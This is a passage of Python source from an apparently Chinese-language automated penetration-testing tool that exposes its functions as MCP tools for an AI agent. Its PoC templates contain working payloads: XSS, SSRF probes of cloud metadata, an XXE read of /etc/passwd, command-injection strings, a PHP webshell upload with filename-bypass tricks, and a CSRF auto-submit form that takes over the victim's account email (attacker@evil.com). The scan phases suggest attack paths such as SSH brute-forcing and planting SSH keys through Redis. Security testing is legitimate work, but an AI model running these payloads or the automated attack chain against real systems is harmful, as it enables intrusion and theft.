    url = f"{{TARGET}}?{{PARAM}}={{quote(payload)}}"
    try:
        resp = requests.get(url, timeout=10)
        if payload in resp.text:
            print(f"[+] XSS Found! Payload reflected: {{payload}}")
        else:
            print(f"[-] Payload not reflected: {{payload[:30]}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            "curl": f'curl "{target}?{param}=<script>alert(1)</script>"'
        },
        "ssrf": {
            "name": "SSRF PoC",
            "python": f'''#!/usr/bin/env python3
"""SSRF PoC"""
import requests
from urllib.parse import quote

TARGET = "{target}"
PARAM = "{param}"

# 内网探测目标
internal_targets = [
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd"
]

for internal in internal_targets:
    url = f"{{TARGET}}?{{PARAM}}={{quote(internal)}}"
    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Testing: {{internal}}")
        print(f"    Status: {{resp.status_code}}, Length: {{len(resp.text)}}")
        if "root:" in resp.text or "ami-id" in resp.text:
            print(f"[+] SSRF Confirmed!")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            "curl": f'curl "{target}?{param}=http://127.0.0.1:22"'
        },
        "xxe": {
            "name": "XXE PoC",
            "python": f'''#!/usr/bin/env python3
"""XXE PoC"""
import requests

TARGET = "{target}"

# XXE Payload
payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

headers = {{"Content-Type": "application/xml"}}

try:
    resp = requests.post(TARGET, data=payload, headers=headers, timeout=10)
    print(f"[*] Response Status: {{resp.status_code}}")
    if "root:" in resp.text:
        print("[+] XXE Confirmed! File content leaked")
        print(resp.text[:500])
    else:
        print("[-] XXE not confirmed")
except Exception as e:
    print(f"[-] Error: {{e}}")
''',
            "curl": '''curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' "TARGET"'''
        },
        "cmd_inject": {
            "name": "Command Injection PoC",
            "python": f'''#!/usr/bin/env python3
"""Command Injection PoC"""
import requests
from urllib.parse import quote

TARGET = "{target}"
PARAM = "{param}"

payloads = [
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "| cat /etc/passwd"
]

for payload in payloads:
    url = f"{{TARGET}}?{{PARAM}}={{quote(payload)}}"
    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Testing: {{payload}}")
        if "uid=" in resp.text or "root:" in resp.text:
            print(f"[+] Command Injection Confirmed!")
            print(resp.text[:300])
            break
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            "curl": f'curl "{target}?{param}=;id"'
        },
        "file_upload": {
            "name": "File Upload PoC",
            "python": f'''#!/usr/bin/env python3
"""File Upload PoC"""
import requests

TARGET = "{target}"  # 上传接口URL

# PHP Webshell
shell_content = b"<?php system($_GET['cmd']); ?>"

# 测试不同文件名绕过
test_files = [
    ("shell.php", shell_content, "application/x-php"),
    ("shell.php.jpg", shell_content, "image/jpeg"),
    ("shell.phtml", shell_content, "text/html"),
    ("shell.php%00.jpg", shell_content, "image/jpeg"),
]

for filename, content, mime in test_files:
    files = {{"file": (filename, content, mime)}}
    try:
        resp = requests.post(TARGET, files=files, timeout=10)
        print(f"[*] Uploading: {{filename}}")
        print(f"    Status: {{resp.status_code}}")
        if resp.status_code == 200:
            print(f"[+] Upload may have succeeded!")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            "curl": 'curl -F "file=@shell.php;type=image/jpeg" "TARGET"'
        },
        "idor": {
            "name": "IDOR PoC",
            "python": f'''#!/usr/bin/env python3
"""IDOR PoC"""
import requests

TARGET = "{target}"
PARAM = "{param}"

# 测试ID遍历
test_ids = [1, 2, 3, 100, 1000, 0, -1]

results = []
for test_id in test_ids:
    url = f"{{TARGET}}?{{PARAM}}={{test_id}}"
    try:
        resp = requests.get(url, timeout=10)
        results.append({{
            "id": test_id,
            "status": resp.status_code,
            "length": len(resp.text)
        }})
        print(f"[*] ID={{test_id}}: Status={{resp.status_code}}, Length={{len(resp.text)}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")

# 分析结果
lengths = [r["length"] for r in results if r["status"] == 200]
if len(set(lengths)) > 1:
    print("[+] Potential IDOR: Different IDs return different content!")
''',
            "curl": f'for i in 1 2 3 100; do curl "{target}?{param}=$i"; done'
        },
        "csrf": {
            "name": "CSRF PoC",
            "html": f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>CSRF PoC</h1>
<form id="csrf_form" action="{target}" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="password" value="hacked123">
</form>
<script>document.getElementById('csrf_form').submit();</script>
</body>
</html>''',
            "note": "将此HTML托管在攻击者服务器，诱导受害者访问"
        }
    }

    vuln_lower = vuln_type.lower().replace(" ", "_").replace("-", "_")

    for key, template in poc_templates.items():
        if key in vuln_lower or vuln_lower in key:
            return {
                "success": True,
                "vuln_type": vuln_type,
                "poc_name": template["name"],
                "poc_code": template
            }

    return {
        "success": False,
        "error": f"不支持的漏洞类型: {vuln_type}",
        "supported_types": list(poc_templates.keys())
    }

def _run_pentest_phase(target: str, url: str, domain: str, phase: str, report: dict) -> dict:
    """执行单个渗透测试阶段 - 内部函数"""
    phase_timeout = PENTEST_PHASES.get(phase, {}).get("timeout", 60)
    single_check_timeout = 15  # 单个检测最大15秒

    if phase == "recon":
        report["phases"]["recon"] = {"status": "running", "results": {}}

        # DNS
        dns_result = safe_execute(dns_lookup, domain, timeout_sec=single_check_timeout)
        report["phases"]["recon"]["results"]["dns"] = dns_result
        if dns_result.get("success"):
            report["findings"].append({"phase": "recon", "type": "info", "detail": f"DNS解析成功: {dns_result.get('records', [])}"})

        # HTTP探测
        http_result = safe_execute(http_probe, url, timeout_sec=single_check_timeout)
        report["phases"]["recon"]["results"]["http"] = http_result
        if http_result.get("success"):
            report["findings"].append({"phase": "recon", "type": "info", "detail": f"HTTP状态: {http_result.get('status_code')}, Server: {http_result.get('server')}"})

        # 技术栈识别
        tech_result = safe_execute(tech_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["recon"]["results"]["tech"] = tech_result
        if tech_result.get("success"):
            tech = tech_result.get("technology", {})
            if tech.get("cms"):
                report["findings"].append({"phase": "recon", "type": "info", "detail": f"检测到CMS: {tech['cms']}"})
                for cms in tech["cms"]:
                    if cms == "WordPress":
                        report["attack_paths"].append("WordPress: 尝试 /wp-admin, xmlrpc.php, 插件漏洞")
                    elif cms == "ThinkPHP":
                        report["attack_paths"].append("ThinkPHP: 尝试 RCE漏洞 (5.x版本)")

        # 子域名枚举 (限制线程数)
        subdomain_result = safe_execute(subdomain_bruteforce, domain, threads=3, timeout_sec=20)
        report["phases"]["recon"]["results"]["subdomains"] = subdomain_result
        if subdomain_result.get("success") and subdomain_result.get("found"):
            report["findings"].append({"phase": "recon", "type": "info", "detail": f"发现 {len(subdomain_result['found'])} 个子域名"})

        # 端口扫描
        try:
            ip = socket.gethostbyname(domain)
            port_result = safe_execute(port_scan, ip, timeout_sec=20)
            report["phases"]["recon"]["results"]["ports"] = port_result
            if port_result.get("success"):
                open_ports = port_result.get("data", {}).get("open_ports", [])
                if open_ports:
                    report["findings"].append({"phase": "recon", "type": "info", "detail": f"开放端口: {open_ports}"})
                    if 22 in open_ports:
                        report["attack_paths"].append("SSH(22): 尝试弱口令爆破")
                    if 3306 in open_ports:
                        report["attack_paths"].append("MySQL(3306): 尝试弱口令, 未授权访问")
                    if 6379 in open_ports:
                        report["attack_paths"].append("Redis(6379): 尝试未授权访问, 写入SSH密钥")
        except Exception:
            pass

        report["phases"]["recon"]["status"] = "completed"

    elif phase == "vuln_basic":
        report["phases"]["vuln_scan"] = {"status": "running", "results": {}}

        # 目录扫描
        dir_result = safe_execute(dir_bruteforce, url, threads=3, timeout_sec=20)
        report["phases"]["vuln_scan"]["results"]["directories"] = dir_result
        if dir_result.get("success") and dir_result.get("found"):
            for item in dir_result["found"]:
                if item["status"] == 200:
                    report["findings"].append({"phase": "vuln_scan", "type": "info", "detail": f"发现目录: {item['path']}"})
                    if item["path"] in [".git", ".svn", ".env", "backup"]:
                        report["findings"].append({"phase": "vuln_scan", "type": "high", "detail": f"敏感目录泄露: {item['path']}"})
                        report["risk_summary"]["high"] += 1

        # 敏感文件扫描
        sensitive_result = safe_execute(sensitive_scan, url, threads=3, timeout_sec=20)
        report["phases"]["vuln_scan"]["results"]["sensitive"] = sensitive_result
        if sensitive_result.get("success") and sensitive_result.get("sensitive_files"):
            for f in sensitive_result["sensitive_files"]:
                report["findings"].append({"phase": "vuln_scan", "type": "high", "detail": f"敏感文件泄露: {f['path']}"})
                report["risk_summary"]["high"] += 1

        # 基础漏洞检测
        vuln_result = safe_execute(vuln_check, url, timeout_sec=single_check_timeout)
        report["phases"]["vuln_scan"]["results"]["vulns"] = vuln_result
        if vuln_result.get("success") and vuln_result.get("vulnerabilities"):
            for v in vuln_result["vulnerabilities"]:
                severity = v.get("severity", "MEDIUM").lower()
                report["findings"].append({"phase": "vuln_scan", "type": severity, "detail": f"{v['type']}"})
                report["risk_summary"][severity] += 1

        # SQL注入检测
        sqli_result = safe_execute(sqli_detect, url, timeout_sec=20)
        report["phases"]["vuln_scan"]["results"]["sqli"] = sqli_result
        if sqli_result.get("success") and sqli_result.get("sqli_vulns"):
            for v in sqli_result["sqli_vulns"]:
                report["findings"].append({"phase": "vuln_scan", "type": "critical", "detail": f"SQL注入: 参数 {v['param']}"})
                report["risk_summary"]["critical"] += 1
                report["attack_paths"].append(f"SQL注入: 参数 {v['param']} 可利用")

        # XSS检测
        xss_result = safe_execute(xss_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["vuln_scan"]["results"]["xss"] = xss_result
        if xss_result.get("success") and xss_result.get("xss_vulns"):
            for v in xss_result["xss_vulns"]:
                report["findings"].append({"phase": "vuln_scan", "type": "high", "detail": f"XSS漏洞: 参数 {v['param']}"})
                report["risk_summary"]["high"] += 1

        report["phases"]["vuln_scan"]["status"] = "completed"

    elif phase == "vuln_advanced":
        report["phases"]["advanced_scan"] = {"status": "running", "results": {}}

        # CSRF检测
        csrf_result = safe_execute(csrf_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["csrf"] = csrf_result
        if csrf_result.get("success") and csrf_result.get("csrf_vulns"):
            for v in csrf_result["csrf_vulns"]:
                severity = v.get("severity", "MEDIUM").lower()
                report["findings"].append({"phase": "advanced_scan", "type": severity, "detail": f"CSRF: {v['type']}"})
                report["risk_summary"][severity] += 1

        # SSRF检测
        ssrf_result = safe_execute(ssrf_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["ssrf"] = ssrf_result
        if ssrf_result.get("success") and ssrf_result.get("ssrf_vulns"):
            for v in ssrf_result["ssrf_vulns"]:
                report["findings"].append({"phase": "advanced_scan", "type": "critical", "detail": f"SSRF: 参数 {v['param']}"})
                report["risk_summary"]["critical"] += 1
                report["attack_paths"].append(f"SSRF: 参数 {v['param']} 可访问内网资源")

        # 命令注入检测
        cmd_result = safe_execute(cmd_inject_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["cmd_inject"] = cmd_result
        if cmd_result.get("success") and cmd_result.get("cmd_vulns"):
            for v in cmd_result["cmd_vulns"]:
                report["findings"].append({"phase": "advanced_scan", "type": "critical", "detail": f"命令注入: 参数 {v['param']}"})
                report["risk_summary"]["critical"] += 1
                report["attack_paths"].append(f"命令注入: 参数 {v['param']} 可执行系统命令")

        # XXE检测
        xxe_result = safe_execute(xxe_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["xxe"] = xxe_result
        if xxe_result.get("success") and xxe_result.get("xxe_vulns"):
            for v in xxe_result["xxe_vulns"]:
                severity = v.get("severity", "HIGH").lower()
                report["findings"].append({"phase": "advanced_scan", "type": severity, "detail": f"XXE: {v['type']}"})
                report["risk_summary"][severity] += 1

        # IDOR检测
        idor_result = safe_execute(idor_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["idor"] = idor_result
        if idor_result.get("success") and idor_result.get("idor_vulns"):
            for v in idor_result["idor_vulns"]:
                report["findings"].append({"phase": "advanced_scan", "type": "high", "detail": f"IDOR: 参数 {v['param']}"})
                report["risk_summary"]["high"] += 1
                report["attack_paths"].append(f"IDOR: 参数 {v['param']} 可越权访问")

        # 认证绕过检测
        auth_result = safe_execute(auth_bypass_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["auth_bypass"] = auth_result
        if auth_result.get("success") and auth_result.get("auth_bypass_vulns"):
            for v in auth_result["auth_bypass_vulns"]:
                report["findings"].append({"phase": "advanced_scan", "type": "high", "detail": f"认证绕过: {v['type']}"})
                report["risk_summary"]["high"] += 1

        # 逻辑漏洞检测
        logic_result = safe_execute(logic_vuln_check, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["logic"] = logic_result
        if logic_result.get("success") and logic_result.get("findings"):
            for f in logic_result["findings"]:
                severity = f.get("severity", "INFO").lower()
                report["findings"].append({"phase": "advanced_scan", "type": severity, "detail": f"逻辑漏洞风险: {f['type']}"})
                report["risk_summary"][severity] += 1
            if logic_result.get("recommendations"):
                report["recommendations"].extend(logic_result["recommendations"][:5])

        # 文件上传检测
        upload_result = safe_execute(file_upload_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["file_upload"] = upload_result
        if upload_result.get("success") and upload_result.get("upload_vulns"):
            for v in upload_result["upload_vulns"]:
                severity = v.get("severity", "INFO").lower()
                report["findings"].append({"phase": "advanced_scan", "type": severity, "detail": f"文件上传: {v['type']}"})
                report["risk_summary"][severity] += 1

        # SSTI检测
        ssti_result = safe_execute(ssti_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["ssti"] = ssti_result
        if ssti_result.get("success") and ssti_result.get("ssti_vulns"):
            for v in ssti_result["ssti_vulns"]:
                report["findings"].append({"phase": "advanced_scan", "type": "critical", "detail": f"SSTI模板注入: {v['engine']} - 参数 {v['param']}"})
                report["risk_summary"]["critical"] += 1
                report["attack_paths"].append(f"SSTI: {v['engine']}模板注入可执行任意代码")

        # LFI检测
        lfi_result = safe_execute(lfi_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["lfi"] = lfi_result
        if lfi_result.get("success") and lfi_result.get("lfi_vulns"):
            for v in lfi_result["lfi_vulns"]:
                severity = "critical" if v["type"] == "LFI" else "high"
                report["findings"].append({"phase": "advanced_scan", "type": severity, "detail": f"{v['type']}: 参数 {v['param']}"})
                report["risk_summary"][severity] += 1
                report["attack_paths"].append(f"文件包含: 参数 {v['param']} 可读取敏感文件")

        # WAF检测
        waf_result = safe_execute(waf_detect, url, timeout_sec=single_check_timeout)
        report["phases"]["advanced_scan"]["results"]["waf"] = waf_result
        if waf_result.get("waf_detected"):
            for w in waf_result["detected_wafs"]:
                report["findings"].append({"phase": "advanced_scan", "type": "info", "detail": f"检测到WAF: {w['waf']} (置信度: {w['confidence']}%)"})
                report["risk_summary"]["info"] += 1

        report["phases"]["advanced_scan"]["status"] = "completed"

    return report

@mcp.tool()
def pentest_phase(target: str, phase: str = "recon") -> dict:
    """分阶段渗透测试 - 执行单个阶段，避免超时

    Args:
        target: 目标URL或域名
        phase: 阶段名称 (recon/vuln_basic/vuln_advanced)

    Returns:
        该阶段的扫描结果
    """
    from datetime import datetime

    if phase not in PENTEST_PHASES:
        return {
            "success": False,
            "error": f"不支持的阶段: {phase}",
            "available_phases": list(PENTEST_PHASES.keys()),
            "phase_info": {k: v["name"] for k, v in PENTEST_PHASES.items()}
        }

    # 解析目标
    if target.startswith("http"):
        from urllib.parse import urlparse
        parsed = urlparse(target)
        domain = parsed.netloc
        url = target
    else:
        domain = target
        url = f"https://{target}"

    report = {
        "target": target,
        "phase": phase,
        "phase_name": PENTEST_PHASES[phase]["name"],
        "start_time": datetime.now().isoformat(),
        "phases": {},
        "findings": [],
        "risk_summary": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
        "attack_paths": [],
        "recommendations": []
    }

    # 执行指定阶段
    report = _run_pentest_phase(target, url, domain, phase, report)

    report["end_time"] = datetime.now().isoformat()
    report["overall_risk"] = "CRITICAL" if report["risk_summary"]["critical"] > 0 else \
                            "HIGH" if report["risk_summary"]["high"] > 0 else \
                            "MEDIUM" if report["risk_summary"]["medium"] > 0 else "LOW"

    return {"success": True, "report": report}

@mcp.tool()
def auto_pentest(target: str, deep_scan: bool = True) -> dict:
    """全自动渗透测试 - 智能分析目标并执行完整渗透测试流程

    Args:
        target: 目标URL或域名
        deep_scan: 是否执行深度扫描(包含CSRF/SSRF/XXE等高级检测)

    注意: 此函数使用分阶段执行+超时保护，避免MCP调用超时。
    如需更精细控制，请使用 pentest_phase() 分阶段执行。
    """
    from datetime import datetime

    report = {
        "target": target,
        "start_time": datetime.now().isoformat(),
        "scan_mode": "deep" if deep_scan else "quick",
        "phases": {},
        "findings": [],
        "risk_summary": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
        "attack_paths": [],
        "recommendations": []
    }

    # 解析目标
    if target.startswith("http"):
        from urllib.parse import urlparse
        parsed = urlparse(target)
        domain = parsed.netloc
        url = target
    else:
        domain = target
        url = f"https://{target}"

    # ===== 阶段1: 信息收集 (使用超时保护) =====
    report = _run_pentest_phase(target, url, domain, "recon", report)

    # ===== 阶段2: 基础漏洞扫描 =====
    report = _run_pentest_phase(target, url, domain, "vuln_basic", report)

    # ===== 阶段3: 高级漏洞检测 (深度扫描) =====
    if deep_scan:
        report = _run_pentest_phase(target, url, domain, "vuln_advanced", report)

    # ===== 阶段4: 生成建议 =====
    if report["risk_summary"]["critical"] > 0:
        report["recommendations"].append("【紧急】发现严重漏洞，建议立即修复SQL注入等高危漏洞")
    if report["risk_summary"]["high"] > 0:
        report["recommendations"].append("【高危】存在敏感信息泄露，建议删除或限制访问敏感文件")
    if report["risk_summary"]["medium"] > 0:
        report["recommendations"].append("【中危】存在配置问题，建议加强安全头配置和CORS策略")

    report["end_time"] = datetime.now().isoformat()
    report["overall_risk"] = "CRITICAL" if report["risk_summary"]["critical"] > 0 else \
                            "HIGH" if report["risk_summary"]["high"] > 0 else \
                            "MEDIUM" if report["risk_summary"]["medium"] > 0 else "LOW"

    return {"success": True, "report": report}

def _get_chinese_font():
    """跨平台获取中文字体路径"""
    import tempfile
    font_paths = []

    if platform.system() == "Windows":
        font_paths = [
            os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "Fonts", "msyh.ttc"),
            os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "Fonts", "simhei.ttf"),
            os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "Fonts", "simsun.ttc"),
        ]
    elif platform.system() == "Darwin":  # macOS
        font_paths = [
            "/System/Library/Fonts/PingFang.ttc",
            "/System/Library/Fonts/STHeiti Light.ttc",
            "/Library/Fonts/Arial Unicode.ttf",
        ]
    else:  # Linux
        font_paths = [
            "/usr/share/fonts/truetype/wqy/wqy-microhei.ttc",
            "/usr/share/fonts/truetype/wqy/wqy-zenhei.ttc",
            "/usr/share/fonts/opentype/noto/NotoSansCJK-Regular.ttc",
            "/usr/share/fonts/truetype/droid/DroidSansFallbackFull.ttf",
        ]

    for path in font_paths:
        if os.path.exists(path):
            return path
    return None

def _generate_html_report(report_data: dict, cve_info: list) -> dict:
    """生成HTML格式报告"""
    import tempfile
    from jinja2 import Template

    html_template = '''<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>渗透测试报告 - {{ target }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
               background: #0a0a0a; color: #e0e0e0; line-height: 1.6; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        header { background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 40px;
                 border-radius: 10px; margin-bottom: 30px; border: 1px solid #333; }
        h1 { color: #00ff88; font-size: 2.5em; margin-bottom: 10px; }
        h2 { color: #00d4ff; margin: 30px 0 15px; padding-bottom: 10px; border-bottom: 2px solid #333; }
        .meta { color: #888; font-size: 0.9em; }
        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
        .summary-card { background: #1a1a1a; padding: 20px; border-radius: 8px; text-align: center; border: 1px solid #333; }
        .summary-card.critical { border-color: #ff4757; }
        .summary-card.high { border-color: #ff6b6b; }
        .summary-card.medium { border-color: #ffa502; }
        .summary-card.low { border-color: #2ed573; }
        .summary-card .count { font-size: 2em; font-weight: bold; }
        .summary-card.critical .count { color: #ff4757; }
        .summary-card.high .count { color: #ff6b6b; }
        .summary-card.medium .count { color: #ffa502; }
        .summary-card.low .count { color: #2ed573; }
        .finding { background: #1a1a1a; padding: 15px; border-radius: 8px; margin: 10px 0; border-left: 4px solid #333; }
        .finding.critical { border-left-color: #ff4757; }
        .finding.high { border-left-color: #ff6b6b; }
        .finding.medium { border-left-color: #ffa502; }
        .finding.low { border-left-color: #2ed573; }
        .badge { display: inline-block; padding: 3px 10px; border-radius: 4px; font-size: 0.8em; font-weight: bold; }
        .badge.critical { background: #ff4757; color: white; }
        .badge.high { background: #ff6b6b; color: white; }
        .badge.medium { background: #ffa502; color: black; }
        .badge.low { background: #2ed573; color: black; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #1a1a1a; color: #00d4ff; }
        footer { text-align: center; padding: 30px; color: #666; margin-top: 40px; border-top: 1px solid #333; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔒 渗透测试报告</h1>
            <p class="meta">目标: {{ target }}</p>
            <p class="meta">测试时间: {{ start_time }} ~ {{ end_time }}</p>
            <p class="meta">整体风险等级: <strong style="color: {% if overall_risk == 'CRITICAL' %}#ff4757{% elif overall_risk == 'HIGH' %}#ff6b6b{% elif overall_risk == 'MEDIUM' %}#ffa502{% else %}#2ed573{% endif %}">{{ overall_risk }}</strong></p>
        </header>

        <section>
            <h2>📊 风险统计</h2>
            <div class="summary">
                <div class="summary-card critical"><div class="count">{{ risk_summary.critical }}</div><div>严重</div></div>
                <div class="summary-card high"><div class="count">{{ risk_summary.high }}</div><div>高危</div></div>
                <div class="summary-card medium"><div class="count">{{ risk_summary.medium }}</div><div>中危</div></div>
                <div class="summary-card low"><div class="count">{{ risk_summary.low }}</div><div>低危</div></div>
            </div>
        </section>

        <section>
            <h2>🔍 发现的问题</h2>
            {% for finding in findings %}
            <div class="finding {{ finding.type }}">
                <span class="badge {{ finding.type }}">{{ finding.type|upper }}</span>
                {{ finding.detail }}
            </div>
            {% endfor %}
        </section>

        <section>
            <h2>⚔️ 攻击路径建议</h2>
            <ul>{% for path in attack_paths %}<li>{{ path }}</li>{% endfor %}</ul>
        </section>

        {% if cve_info %}
        <section>
            <h2>🛡️ 相关CVE漏洞</h2>
            <table>
                <tr><th>技术</th><th>CVE编号</th><th>CVSS</th><th>描述</th></tr>
                {% for cve in cve_info %}
                <tr><td>{{ cve.tech }}</td><td>{{ cve.cve_id }}</td><td>{{ cve.cvss }}</td><td>{{ cve.summary }}</td></tr>
                {% endfor %}
            </table>
        </section>
        {% endif %}

        <section>
            <h2>✅ 修复建议</h2>
            <ul>{% for rec in recommendations %}<li>{{ rec }}</li>{% endfor %}</ul>
        </section>

        <footer>
            <p>AutoRedTeam v2.0 - 自动化渗透测试报告</p>
            <p>⚠️ 仅用于授权的安全测试</p>
        </footer>
    </div>
</body>
</html>'''

    template = Template(html_template)
    html_content = template.render(**report_data, cve_info=cve_info)

    # 保存到临时目录
    filename = f"pentest_report_{int(time.time())}.html"
    filepath = os.path.join(tempfile.gettempdir(), filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html_content)

    return {"success": True, "format": "html", "path": filepath, "preview": html_content[:500] + "..."}

def _generate_pdf_report(report_data: dict, cve_info: list) -> dict:
    """生成PDF格式报告 (支持中文)"""
    import tempfile
    try:
        from reportlab.lib.pagesizes import A4
        from reportlab.lib import colors
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
        from reportlab.pdfbase import pdfmetrics
        from reportlab.pdfbase.ttfonts import TTFont
    except ImportError:
        return {"success": False, "error": "reportlab 未安装，请运行: pip install reportlab"}

    # 注册中文字体
    font_path = _get_chinese_font()
    font_name = "ChineseFont"
    if font_path:
        try:
            pdfmetrics.registerFont(TTFont(font_name, font_path))
        except Exception:
            font_name = "Helvetica"
    else:
        font_name = "Helvetica"

    # 创建PDF
    filename = f"pentest_report_{int(time.time())}.pdf"
    filepath = os.path.join(tempfile.gettempdir(), filename)
    doc = SimpleDocTemplate(filepath, pagesize=A4)

    styles = getSampleStyleSheet()
    styles.add(ParagraphStyle(name='Chinese', fontName=font_name, fontSize=10, leading=14))
    styles.add(ParagraphStyle(name='ChineseTitle', fontName=font_name, fontSize=18, leading=22, spaceAfter=12))
    styles.add(ParagraphStyle(name='ChineseH2', fontName=font_name, fontSize=14, leading=18, spaceAfter=8, textColor=colors.darkblue))

    story = []

    # 标题
    story.append(Paragraph("渗透测试报告", styles['ChineseTitle']))
    story.append(Spacer(1, 12))

    # 基本信息
    story.append(Paragraph(f"目标: {report_data.get('target', 'N/A')}", styles['Chinese']))
    story.append(Paragraph(f"测试时间: {report_data.get('start_time', '')} ~ {report_data.get('end_time', '')}", styles['Chinese']))
    story.append(Paragraph(f"整体风险等级: {report_data.get('overall_risk', 'N/A')}", styles['Chinese']))
    story.append(Spacer(1, 20))

    # 风险统计表格
    story.append(Paragraph("风险统计", styles['ChineseH2']))
    risk = report_data.get('risk_summary', {})
    risk_data = [
        ['等级', '数量'],
        ['严重', str(risk.get('critical', 0))],
        ['高危', str(risk.get('high', 0))],
        ['中危', str(risk.get('medium', 0))],
        ['低危', str(risk.get('low', 0))],
        ['信息', str(risk.get('info', 0))],
    ]
    t = Table(risk_data, colWidths=[200, 100])
    t.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('FONTNAME', (0, 0), (-1, -1), font_name),
        ('FONTSIZE', (0, 0), (-1, -1), 10),
        ('GRID', (0, 0), (-1, -1), 1, colors.black),
    ]))
    story.append(t)
    story.append(Spacer(1, 20))

    # 发现的问题
    story.append(Paragraph("发现的问题", styles['ChineseH2']))
    for finding in report_data.get('findings', [])[:20]:  # 限制数量
        severity = finding.get('type', 'info').upper()
        detail = finding.get('detail', '')
        story.append(Paragraph(f"[{severity}] {detail}", styles['Chinese']))
    story.append(Spacer(1, 20))

    # 修复建议
    story.append(Paragraph("修复建议", styles['ChineseH2']))
    for rec in report_data.get('recommendations', []):
        story.append(Paragraph(f"• {rec}", styles['Chinese']))

    doc.build(story)
    return {"success": True, "format": "pdf", "path": filepath}

@mcp.tool()
def generate_report(target: str, format: str = "markdown", include_cve: bool = True) -> dict:
    """生成渗透测试报告 - 执行完整测试并生成专业报告

    Args:
        target: 目标URL或域名
        format: 报告格式 (markdown/json/html/pdf)
        include_cve: 是否包含CVE信息
    """
    from datetime import datetime

    # 执行完整渗透测试
    pentest_result = auto_pentest(target)
    if not pentest_result.get("success"):
        return pentest_result

    report_data = pentest_result["report"]

    # 获取CVE信息
    cve_info = []
    if include_cve:
        # 从技术栈检测结果中获取技术
        tech_result = report_data.get("phases", {}).get("recon", {}).get("results", {}).get("tech", {})
        if tech_result and tech_result.get("success"):
            tech = tech_result.get("technology", {})
            search_terms = []

            if tech.get("server"):
                search_terms.append(tech["server"].split("/")[0])
            for cms in tech.get("cms", []):
                search_terms.append(cms)
            for fw in tech.get("frameworks", []):
                search_terms.append(fw)

            # 搜索相关CVE
            for term in search_terms[:3]:  # 限制搜索数量
                try:
                    cve_result = cve_search(term, source="nvd")
                    if cve_result.get("success") and cve_result.get("results"):
                        for cve in cve_result["results"][:3]:
                            cve_info.append({
                                "tech": term,
                                "cve_id": cve.get("cve_id"),
                                "cvss": cve.get("cvss"),
                                "summary": cve.get("summary", "")[:100]
                            })
                except Exception:
                    pass

    report_data["related_cves"] = cve_info

    if format == "markdown":
        md = f"""# 渗透测试报告

## 基本信息
- **目标**: {report_data['target']}
- **测试时间**: {report_data['start_time']} ~ {report_data['end_time']}
- **整体风险等级**: {report_data['overall_risk']}
- **扫描模式**: {report_data.get('scan_mode', 'deep')}

## 风险统计
| 等级 | 数量 |
|------|------|
| 严重 | {report_data['risk_summary']['critical']} |
| 高危 | {report_data['risk_summary']['high']} |
| 中危 | {report_data['risk_summary']['medium']} |
| 低危 | {report_data['risk_summary']['low']} |
| 信息 | {report_data['risk_summary']['info']} |

## 发现的问题
"""
        for i, finding in enumerate(report_data['findings'], 1):
            severity_icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢", "info": "🔵"}.get(finding['type'], "⚪")
            md += f"{i}. {severity_icon} [{finding['type'].upper()}] {finding['detail']}\n"

        md += "\n## 攻击路径建议\n"
        for path in report_data['attack_paths']:
            md += f"- {path}\n"

        # CVE信息部分
        if cve_info:
            md += "\n## 相关CVE漏洞\n"
            md += "| 技术 | CVE编号 | CVSS | 描述 |\n"
